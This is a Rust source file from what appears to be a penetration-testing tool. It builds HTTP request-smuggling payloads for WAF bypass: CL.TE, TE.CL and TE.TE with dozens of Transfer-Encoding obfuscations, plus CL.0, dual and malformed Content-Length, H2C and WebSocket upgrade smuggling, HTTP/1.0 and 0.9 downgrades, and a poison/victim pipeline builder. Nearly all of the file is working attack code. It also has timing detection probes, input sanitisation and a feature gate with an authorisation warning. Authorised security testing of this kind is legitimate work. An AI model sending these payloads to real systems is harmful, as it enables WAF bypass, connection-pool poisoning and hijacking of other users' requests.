//! HTTP request smuggling payloads for WAF bypass.

use crate::safety::{Canary, guard_prefix_len, sanitize_input};

/// A smuggling payload ready to inject into a raw TCP connection.
#[derive(Debug, Clone)]
pub struct SmugglingPayload {
    pub description: String,
    pub variant: SmugglingVariant,
    pub raw_bytes: Vec<u8>,
    pub canary: Canary,
}

/// Which request-smuggling variant this payload targets.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SmugglingVariant {
    ClTe,
    TeCl,
    TeTe,
    H2c,
    WebSocket,
    ClZero,
    DualCl,
    MultiValueCl,
    ClObfuscation,
    ChunkExtension,
    Http10,
    Http09,
    Pipeline,
    DetectClTe,
    DetectTeCl,
    MethodBody,
}

pub const DEFAULT_HTTP2_SETTINGS: &str = "AAMAAABkAARAAAAAAAIAAAAA";

fn ensure_crlf(s: &str) -> String {
    if s.ends_with("\r\n") {
        s.into()
    } else {
        format!("{s}\r\n")
    }
}

fn ensure_double_crlf(s: &str) -> String {
    if s.ends_with("\r\n\r\n") {
        s.into()
    } else if s.ends_with("\r\n") {
        format!("{s}\r\n")
    } else {
        format!("{s}\r\n\r\n")
    }
}

fn validate_host(host: &str) -> Result<String, crate::safety::SafetyError> {
    sanitize_input(host)
}

fn validate_prefix(prefix: &str) -> Result<String, crate::safety::SafetyError> {
    guard_prefix_len(prefix, 64 * 1024)?;
    Ok(prefix.into())
}

/// Generate all TE obfuscation mutations (Smuggler matrix + Unicode + nulls + quotes + case).
pub fn te_obfuscations() -> Vec<String> {
    let base = vec![
        "Transfer-Encoding: chunked",
        "Transfer-Encoding: xchunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding\t: chunked",
        " Transfer-Encoding: chunked",
        "\tTransfer-Encoding: chunked",
        "Transfer-Encoding: chunked ",
        "Transfer-Encoding: chunked\t",
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
        "Transfer-Encoding:\n chunked",
        "Transfer-Encoding:\r\n chunked",
    ];
    let unicode_ws: Vec<String> = [
        '\u{00a0}', '\u{0085}', '\u{1680}', '\u{2000}', '\u{2001}', '\u{2002}', '\u{2003}',
        '\u{2004}', '\u{2005}', '\u{2006}', '\u{2007}', '\u{2008}', '\u{2009}', '\u{200a}',
        '\u{2028}', '\u{2029}', '\u{212a}',
    ]
    .iter()
    .map(|c| format!("Transfer-Encoding:{c}chunked"))
    .collect();
    let nulls: Vec<String> = vec![
        "Transfer-Encoding: \x00chunked".into(),
        "\x00Transfer-Encoding: chunked".into(),
    ];
    let quotes: Vec<String> = vec![
        "Transfer-Encoding: \"chunked\"".into(),
        "Transfer-Encoding: 'chunked'".into(),
        "Transfer-Encoding: `chunked`".into(),
    ];
    let case_vars: Vec<String> = vec![
        "transfer-encoding: chunked".into(),
        "Transfer-encoding: Chunked".into(),
        "TRANSFER-ENCODING: CHUNKED".into(),
    ];
    let prefixes: Vec<String> = vec![
        "X-Transfer-Encoding: chunked".into(),
        "Transfer-Encodingx: chunked".into(),
    ];
    let line_terms: Vec<String> = vec![
        "Transfer-Encoding: chunked\r".into(),
        "Transfer-Encoding: chunked\n".into(),
    ];
    let mut out: Vec<String> = base.into_iter().map(String::from).collect();
    out.extend(unicode_ws);
    out.extend(nulls);
    out.extend(quotes);
    out.extend(case_vars);
    out.extend(prefixes);
    out.extend(line_terms);
    out
}

/// Backward-compatible CL.TE (hardcodes CL=0).
pub fn cl_te(
    host: &str,
    smuggled_prefix: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    cl_te_custom(host, smuggled_prefix, 0)
}

/// CL.TE with a custom Content-Length.
pub fn cl_te_custom(
    host: &str,
    smuggled_prefix: &str,
    content_length: usize,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let body = format!("0\r\n\r\n{prefix}");
    let raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: {content_length}\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         {body}"
    );
    Ok(SmugglingPayload {
        description: format!("CL.TE CL={content_length}"),
        variant: SmugglingVariant::ClTe,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// Backward-compatible TE.CL (dynamically computes CL).
pub fn te_cl(
    host: &str,
    smuggled_prefix: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let smuggled = ensure_crlf(&prefix);
    let smuggled_bytes = smuggled.as_bytes();
    // Chunked framing per RFC: chunk-size CRLF, chunk-data (exactly N octets), CRLF, …, 0 CRLF CRLF.
    let chunk_size_line = format!("{:x}\r\n", smuggled_bytes.len());
    // CL covers just the first chunk-size line (e.g., "5\r\n" => 3 bytes for single-digit)
    let content_length = chunk_size_line.len();
    let mut raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: {content_length}\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n"
    )
    .into_bytes();
    raw.extend_from_slice(chunk_size_line.as_bytes());
    raw.extend_from_slice(smuggled_bytes);
    raw.extend_from_slice(b"\r\n");
    raw.extend_from_slice(b"0\r\n\r\n");
    Ok(SmugglingPayload {
        description: format!("TE.CL CL={content_length}"),
        variant: SmugglingVariant::TeCl,
        raw_bytes: raw,
        canary: Canary::generate(),
    })
}

/// TE.TE with full obfuscation matrix.
pub fn te_te(
    host: &str,
    smuggled_prefix: &str,
    obfuscation_index: usize,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let obs = te_obfuscations();
    let te_header = &obs[obfuscation_index % obs.len()];
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let body = format!("0\r\n\r\n{prefix}");
    let raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: 0\r\n\
         {te_header}\r\n\
         \r\n\
         {body}"
    );
    Ok(SmugglingPayload {
        description: format!("TE.TE obfuscation {}", obfuscation_index % obs.len()),
        variant: SmugglingVariant::TeTe,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// CL.0 payload.
pub fn cl_zero(
    host: &str,
    smuggled_prefix: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: 0\r\n\
         \r\n\
         {prefix}"
    );
    Ok(SmugglingPayload {
        description: "CL.0".into(),
        variant: SmugglingVariant::ClZero,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// Dual-Content-Length payload.
pub fn dual_cl(
    host: &str,
    smuggled_prefix: &str,
    cl1: usize,
    cl2: usize,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: {cl1}\r\n\
         Content-Length: {cl2}\r\n\
         \r\n\
         {prefix}"
    );
    Ok(SmugglingPayload {
        description: format!("Dual-CL {cl1}/{cl2}"),
        variant: SmugglingVariant::DualCl,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// Multi-value Content-Length.
pub fn multi_value_cl(
    host: &str,
    smuggled_prefix: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: 5, 6\r\n\
         \r\n\
         {prefix}"
    );
    Ok(SmugglingPayload {
        description: "Multi-value CL".into(),
        variant: SmugglingVariant::MultiValueCl,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// Content-Length formatting mutations.
pub fn cl_obfuscation(
    host: &str,
    smuggled_prefix: &str,
) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let values = vec!["+5", "05", "5 ", "\t5"];
    Ok(values
        .into_iter()
        .map(|v| {
            let raw = format!(
                "POST / HTTP/1.1\r\n\
                 Host: {host}\r\n\
                 Content-Length: {v}\r\n\
                 \r\n\
                 {prefix}"
            );
            SmugglingPayload {
                description: format!("CL-obfuscation '{v}'"),
                variant: SmugglingVariant::ClObfuscation,
                raw_bytes: raw.into_bytes(),
                canary: Canary::generate(),
            }
        })
        .collect())
}

/// Chunk-extension payload.
pub fn chunk_extension(
    host: &str,
    smuggled_prefix: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let body = format!("1;ext=foo\r\nX\r\n0\r\n\r\n{prefix}");
    let raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         {body}"
    );
    Ok(SmugglingPayload {
        description: "Chunk-extension".into(),
        variant: SmugglingVariant::ChunkExtension,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// Chunk-size formatting mutations.
pub fn chunk_size_mutations(
    host: &str,
    smuggled_prefix: &str,
) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let sizes = vec!["00000001", "1A", "1;", "1\t"];
    Ok(sizes
        .into_iter()
        .map(|sz| {
            let body = format!("{sz}\r\nX\r\n0\r\n\r\n{prefix}");
            let raw = format!(
                "POST / HTTP/1.1\r\n\
                 Host: {host}\r\n\
                 Transfer-Encoding: chunked\r\n\
                 \r\n\
                 {body}"
            );
            SmugglingPayload {
                description: format!("Chunk-size '{sz}'"),
                variant: SmugglingVariant::ChunkExtension,
                raw_bytes: raw.into_bytes(),
                canary: Canary::generate(),
            }
        })
        .collect())
}

/// GET/PUT/DELETE/... body smuggling.
pub fn method_body_smuggle(
    method: &str,
    host: &str,
    smuggled_prefix: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    let raw = format!(
        "{method} / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: {}\r\n\
         \r\n\
         {prefix}",
        prefix.len()
    );
    Ok(SmugglingPayload {
        description: format!("Method-body {method}"),
        variant: SmugglingVariant::MethodBody,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// HTTP/1.0 persistence disagreement.
pub fn http10_persistence(
    host: &str,
    smuggled_prefix: &str,
) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
    let host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let prefix = ensure_double_crlf(&prefix);
    Ok(vec![
        format!(
            "POST / HTTP/1.0\r\n\
             Host: {host}\r\n\
             Connection: keep-alive\r\n\
             Content-Length: {}\r\n\
             \r\n\
             {prefix}",
            prefix.len()
        ),
        format!(
            "POST / HTTP/1.0\r\n\
             Host: {host}\r\n\
             Proxy-Connection: keep-alive\r\n\
             Content-Length: {}\r\n\
             \r\n\
             {prefix}",
            prefix.len()
        ),
    ]
    .into_iter()
    .map(|raw| SmugglingPayload {
        description: "HTTP/1.0 persistence".into(),
        variant: SmugglingVariant::Http10,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
    .collect())
}

/// HTTP/0.9 simple-request smuggling.
pub fn http09_downgrade(
    host: &str,
    smuggled_prefix: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let _host = validate_host(host)?;
    let prefix = validate_prefix(smuggled_prefix)?;
    let raw = format!("GET /\r\n{}", ensure_double_crlf(&prefix));
    Ok(SmugglingPayload {
        description: "HTTP/0.9 simple-request".into(),
        variant: SmugglingVariant::Http09,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// Pipeline builder: returns (poison, victim) byte sequences.
pub fn pipeline_builder(
    poison: &SmugglingPayload,
    victim_method: &str,
    victim_path: &str,
    host: &str,
) -> Result<(Vec<u8>, Vec<u8>), crate::safety::SafetyError> {
    let _host = sanitize_input(host)?;
    let _victim_method = sanitize_input(victim_method)?;
    let _victim_path = sanitize_input(victim_path)?;
    let victim = format!("{victim_method} {victim_path} HTTP/1.1\r\nHost: {host}\r\n\r\n");
    Ok((poison.raw_bytes.clone(), victim.into_bytes()))
}

/// Safe detection probe for CL.TE (causes back-end hang without socket poisoning).
///
/// Body shape is the canonical Portswigger CL.TE timing oracle:
///
/// ```text
/// 0\r\n
/// \r\n
/// X
/// ```
///
/// That's exactly 6 bytes (`0`, `\r`, `\n`, `\r`, `\n`, `X`).
/// Pre-fix this used `0\r\nX\r\n\r\n` — 8 bytes with data AFTER the
/// final chunk terminator. RFC 7230 §4.1 says trailers may follow
/// `0\r\n` but only as `name: value\r\n*` then `\r\n` — a bare
/// byte like `X` makes the body invalid chunked encoding. Strict
/// parsers (Apache, recent nginx, Envoy) return 400 instead of
/// hanging, defeating the timing oracle. The canonical form keeps
/// the body valid for both interpretations:
///
/// - CL-following frontend (CL=6) reads all 6 bytes and forwards.
/// - TE-following backend reads `0\r\n` (chunk-size 0 = end),
///   then `\r\n` (trailer-section terminator), leaving the `X`
///   in the connection buffer to prepend the next request.
///
/// Result: the backend hangs waiting for the next request (or
/// pipelines a corrupted one); the frontend is satisfied; CL ≠
/// TE confirmed via the latency delta.
pub fn detect_cl_te(host: &str) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = sanitize_input(host)?;
    let raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: 6\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         0\r\n\
         \r\n\
         X"
    );
    Ok(SmugglingPayload {
        description: "Detect CL.TE (timing)".into(),
        variant: SmugglingVariant::DetectClTe,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// Safe detection probe for TE.CL.
pub fn detect_te_cl(host: &str) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = sanitize_input(host)?;
    // Valid chunked prefix but CL shorter than chunk data → back-end hangs
    let raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Content-Length: 4\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         5\r\n\r\n\
         0\r\n\r\n"
    );
    Ok(SmugglingPayload {
        description: "Detect TE.CL (timing)".into(),
        variant: SmugglingVariant::DetectTeCl,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// Precedence test: both CL and TE present with matching body.
pub fn cl_te_precedence_test(
    host: &str,
) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
    let host = sanitize_input(host)?;
    let body = "5\r\nhello\r\n0\r\n\r\n";
    let cl = body.len();
    Ok(vec![SmugglingPayload {
        description: "CL+TE precedence test".into(),
        variant: SmugglingVariant::ClTe,
        raw_bytes: format!(
            "POST / HTTP/1.1\r\n\
                 Host: {host}\r\n\
                 Content-Length: {cl}\r\n\
                 Transfer-Encoding: chunked\r\n\
                 \r\n\
                 {body}"
        )
        .into_bytes(),
        canary: Canary::generate(),
    }])
}

/// H2C upgrade smuggling.
pub fn h2c_smuggle(
    host: &str,
    http2_settings: Option<&str>,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = sanitize_input(host)?;
    let settings = http2_settings.unwrap_or(DEFAULT_HTTP2_SETTINGS);
    let raw = format!(
        "GET / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         HTTP2-Settings: {settings}\r\n\
         \r\n"
    );
    Ok(SmugglingPayload {
        description: "H2C upgrade".into(),
        variant: SmugglingVariant::H2c,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// H2C `--upgrade-only` variant.
pub fn h2c_upgrade_only_smuggle(
    host: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = sanitize_input(host)?;
    let raw = format!(
        "GET / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Connection: Upgrade\r\n\
         Upgrade: h2c\r\n\
         \r\n"
    );
    Ok(SmugglingPayload {
        description: "H2C upgrade-only".into(),
        variant: SmugglingVariant::H2c,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// Malformed HTTP2-Settings variants.
pub fn malformed_http2_settings(
    host: &str,
) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
    let host = sanitize_input(host)?;
    let settings = vec!["!!!", "", "AA"];
    Ok(settings
        .into_iter()
        .map(|s| {
            let raw = format!(
                "GET / HTTP/1.1\r\n\
                 Host: {host}\r\n\
                 Connection: Upgrade, HTTP2-Settings\r\n\
                 Upgrade: h2c\r\n\
                 HTTP2-Settings: {s}\r\n\
                 \r\n"
            );
            SmugglingPayload {
                description: format!("H2C malformed settings '{s}'"),
                variant: SmugglingVariant::H2c,
                raw_bytes: raw.into_bytes(),
                canary: Canary::generate(),
            }
        })
        .collect())
}

/// H2C POST-body smuggling.
pub fn h2c_post_smuggle(
    host: &str,
    body: &[u8],
    http2_settings: Option<&str>,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = sanitize_input(host)?;
    let settings = http2_settings.unwrap_or(DEFAULT_HTTP2_SETTINGS);
    let content_length = body.len();
    let mut raw = format!(
        "POST / HTTP/1.1\r\n\
         Host: {host}\r\n\
         Connection: Upgrade, HTTP2-Settings\r\n\
         Upgrade: h2c\r\n\
         HTTP2-Settings: {settings}\r\n\
         Content-Length: {content_length}\r\n\
         \r\n"
    )
    .into_bytes();
    raw.extend_from_slice(body);
    Ok(SmugglingPayload {
        description: format!("H2C POST body={content_length}"),
        variant: SmugglingVariant::H2c,
        raw_bytes: raw,
        canary: Canary::generate(),
    })
}

/// WebSocket smuggling with a random nonce.
pub fn websocket_smuggle(
    host: &str,
    path: &str,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    websocket_smuggle_custom(host, path, None, None)
}

/// WebSocket smuggling with custom key and optional protocols.
pub fn websocket_smuggle_custom(
    host: &str,
    path: &str,
    key: Option<&str>,
    protocols: Option<&str>,
) -> Result<SmugglingPayload, crate::safety::SafetyError> {
    let host = sanitize_input(host)?;
    let path = sanitize_input(path)?;
    if let Some(k) = key {
        crate::safety::guard_no_crlf(k)?;
    }
    if let Some(p) = protocols {
        crate::safety::guard_no_crlf(p)?;
    }
    let key = key.map_or_else(
        || {
            let mut nonce = [0u8; 16];
            rand::Rng::fill(&mut rand::thread_rng(), &mut nonce);
            base64::Engine::encode(&base64::engine::general_purpose::STANDARD, nonce)
        },
        std::string::ToString::to_string,
    );
    let protocol_header = protocols.map_or(String::new(), |p| {
        format!("Sec-WebSocket-Protocol: {p}\r\n")
    });
    let raw = format!(
        "GET {path} HTTP/1.1\r\n\
         Host: {host}\r\n\
         Connection: Upgrade\r\n\
         Upgrade: websocket\r\n\
         Sec-WebSocket-Key: {key}\r\n\
         Sec-WebSocket-Version: 13\r\n\
         {protocol_header}\r\n"
    );
    Ok(SmugglingPayload {
        description: "WebSocket upgrade".into(),
        variant: SmugglingVariant::WebSocket,
        raw_bytes: raw.into_bytes(),
        canary: Canary::generate(),
    })
}

/// All detection probes (safe, never poison sockets).
pub fn all_detection_probes(
    host: &str,
) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
    Ok(vec![detect_cl_te(host)?, detect_te_cl(host)?])
}

/// All exploit payloads (requires `unsafe-probes` feature).
///
/// # Safety
/// Sends intentionally malformed or desynchronising HTTP traffic that may
/// corrupt downstream parser state, poison connection pools, or cause
/// request splitting. Only enable on targets you own or have explicit
/// written authorization to test.
#[cfg(feature = "unsafe-probes")]
pub fn all_payloads(
    host: &str,
    smuggled_prefix: &str,
) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
    let mut out = vec![
        cl_te(host, smuggled_prefix)?,
        te_cl(host, smuggled_prefix)?,
        cl_zero(host, smuggled_prefix)?,
        h2c_smuggle(host, None)?,
        h2c_upgrade_only_smuggle(host)?,
        websocket_smuggle(host, "/")?,
        chunk_extension(host, smuggled_prefix)?,
        dual_cl(host, smuggled_prefix, 6, 5)?,
        multi_value_cl(host, smuggled_prefix)?,
        method_body_smuggle("GET", host, smuggled_prefix)?,
        http09_downgrade(host, smuggled_prefix)?,
    ];
    for i in 1..te_obfuscations().len().min(6) {
        out.push(te_te(host, smuggled_prefix, i)?);
    }
    out.extend(cl_obfuscation(host, smuggled_prefix)?);
    out.extend(chunk_size_mutations(host, smuggled_prefix)?);
    out.extend(http10_persistence(host, smuggled_prefix)?);
    out.extend(malformed_http2_settings(host)?);
    out.extend(cl_te_precedence_test(host)?);
    out.push(h2c_post_smuggle(host, b"test", None)?);
    out.push(websocket_smuggle_custom(host, "/ws", None, None)?);
    Ok(out)
}

#[cfg(test)]
#[path = "smuggling_tests.rs"]
mod tests;
